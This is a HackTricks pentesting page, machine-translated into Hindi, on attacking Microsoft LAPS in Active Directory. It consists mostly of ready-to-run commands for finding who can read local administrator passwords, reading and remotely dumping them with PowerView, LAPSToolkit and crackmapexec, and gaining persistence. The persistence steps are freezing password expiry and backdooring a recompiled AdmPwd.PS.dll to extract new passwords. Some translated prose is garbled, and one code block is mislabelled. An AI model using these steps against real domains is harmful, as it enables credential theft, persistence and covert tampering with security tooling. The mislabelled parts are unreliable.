# LAPS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके [hacktricks repo](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## मूलभूत जानकारी

**LAPS** आपको डोमेन-जुडिकेटेड कंप्यूटरों पर स्थानीय व्यवस्थापक पासवर्ड (जो **यादृच्छिक**, अद्वितीय और **नियमित रूप से बदलता है**) का प्रबंधन करने की अनुमति देता है। ये पासवर्ड सेंट्रली Active Directory में संग्रहीत होते हैं और ACL का उपयोग करके अधिकृत उपयोगकर्ताओं को प्रतिबंधित किया जाता है। पासवर्ड क्लाइंट से सर्वर तक Kerberos v5 और AES का उपयोग करके सुरक्षित रूप से यात्रा करते हैं।

LAPS का उपयोग करते समय, डोमेन के **कंप्यूटर** ऑब्जेक्ट्स में **2 नए गुण** दिखाई देते हैं: **`ms-mcs-AdmPwd`** और **`ms-mcs-AdmPwdExpirationTime`**_._ ये गुण प्लेन-टेक्स्ट व्यवस्थापक पासवर्ड और समाप्ति समय को संग्रहीत करते हैं। फिर, डोमेन माहौल में, यह देखना दिलचस्प हो सकता है कि **कौन से उपयोगकर्ता** इन गुणों को पढ़ सकते हैं।

### सक्रिय होने की जांच करें
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS पासवर्ड एक्सेस

आप `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` से **LAPS नीति को रॉ डाउनलोड** कर सकते हैं और फिर [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) पैकेज के **`Parse-PolFile`** का उपयोग करके इस फ़ाइल को मानव-पठनीय स्वरूप में परिवर्तित किया जा सकता है।

इसके अलावा, यदि हमें पहुंच है तो **नेटिव LAPS PowerShell cmdlets** का उपयोग किया जा सकता है:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** का उपयोग यह भी किया जा सकता है कि पता लगाया जाए कि **कौन पासवर्ड को पढ़ सकता है और उसे पढ़ सकता है**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) लेप्स के जाँच को कई फंक्शनों के साथ सुविधाजनक बनाता है।\
इसमें से एक है **`ExtendedRights`** के लिए **लेप्स सक्षम करने वाले सभी कंप्यूटरों का पार्सिंग**। यह दिखाएगा कि कौन से **समूह** विशेष रूप से **लेप्स पासवर्ड पढ़ने के लिए धारित** हैं, जो अक्सर संरक्षित समूहों में उपयोगकर्ता होते हैं।\
एक **खाता** जो एक कंप्यूटर को डोमेन में जोड़ता है, उस होस्ट पर `सभी Extended Rights` प्राप्त करता है, और यह अधिकार खाते को **पासवर्ड पढ़ने** की क्षमता देता है। जाँच में एक उपयोगकर्ता खाता दिखा सकता है जो होस्ट पर लेप्स पासवर्ड पढ़ सकता है। यह हमें मदद कर सकता है **निश्चित AD उपयोगकर्ताओं** को लक्ष्य बनाने में जो लेप्स पासवर्ड पढ़ सकते हैं।
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **क्रैकमैपेक्सेक के साथ LAPS पासवर्ड्स को डंप करना**
यदि पॉवरशेल तक पहुंच नहीं है, तो आप LDAP के माध्यम से इस विशेषाधिकार का दुरुपयोग करके दूरस्थ रूप से इस्तेमाल कर सकते हैं।
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
यह उपयोगकर्ता द्वारा पढ़े जा सकने वाले सभी पासवर्ड को डंप करेगा, जिससे आपको एक अलग उपयोगकर्ता के साथ बेहतर फुटहोल्ड मिलेगा।

## **LAPS Persistence**

### **समाप्ति तिथि**

एक बार व्यवस्थापक बनने के बाद, आप **पासवर्ड प्राप्त** कर सकते हैं और एक मशीन को **पासवर्ड अपडेट करने से रोक सकते** हैं जब आप **भविष्य में समाप्ति तिथि सेट करते** हैं।
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
यदि कोई **एडमिन** **`Reset-AdmPwdPassword`** cmdlet का उपयोग करता है; या यदि LAPS GPO में **नीति द्वारा आवश्यकतानुसार से अधिक समय तक पासवर्ड समाप्ति की अनुमति नहीं है** इंगित करता है, तो पासवर्ड फिर से रीसेट हो जाएगा।
{% endhint %}

### बैकडोर

LAPS के मूल स्रोत कोड [यहाँ](https://github.com/GreyCorbel/admpwd) मिल सकता है, इसलिए कोड में एक बैकडोर डाला जा सकता है (उदाहरण के लिए `Main/AdmPwd.PS/Main.cs` में `Get-AdmPwdPassword` विधि के अंदर) जो किसी तरह से **नए पासवर्डों को निकालेगा या कहीं संग्रहीत करेगा**।

फिर, नया `AdmPwd.PS.dll` कंपाइल करें और इसे मशीन में `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` पर अपलोड करें (और संशोधन समय बदलें)।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
